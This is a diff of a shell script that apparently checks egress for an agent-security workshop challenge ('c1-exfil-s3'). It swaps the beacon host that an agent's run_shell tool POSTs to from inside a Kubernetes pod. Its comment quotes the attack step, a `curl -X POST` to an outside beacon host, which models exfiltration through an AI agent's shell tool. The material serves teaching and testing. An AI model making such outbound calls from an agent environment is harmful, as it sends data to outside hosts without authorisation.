@@ -4,7 +4,7 @@
 #
 # Usage: CONTEXT=<admin-cluster kube-context> challenges/c1-exfil-s3/fallback.kubectl.sh
 #
-# The beat is run_shell's `curl -X POST https://agenticburn.com/beacon`, and run_shell runs in the
+# The beat is run_shell's `curl -X POST https://beacon.burritobot.co/beacon`, and run_shell runs in the
 # workshop-mcp pod (container "shim"), so that is where this POST is made. The old version called
 # example.com from guard-proxy, which proved nothing about the pod the attack uses (#499).
 #
@@ -21,8 +21,8 @@ command -v curl >/dev/null 2>&1 || { echo "curl not found on PATH" >&2; exit 1; 
 readonly NS="agent"
 readonly POD="deploy/workshop-mcp"
 readonly CONTAINER="shim"
-readonly BEACON="https://agenticburn.com/beacon"
-readonly BEACON_VIEW="https://provisioning.agenticburn.com/beacon/view"
+readonly BEACON="https://beacon.burritobot.co/beacon"
+readonly BEACON_VIEW="https://beacon.burritobot.co/beacon/view"
 readonly BEACON_OK="beacon received by the agenticburn status collector"
 
 kc() { kubectl --context "${CONTEXT}" -n "${NS}" "$@"; }
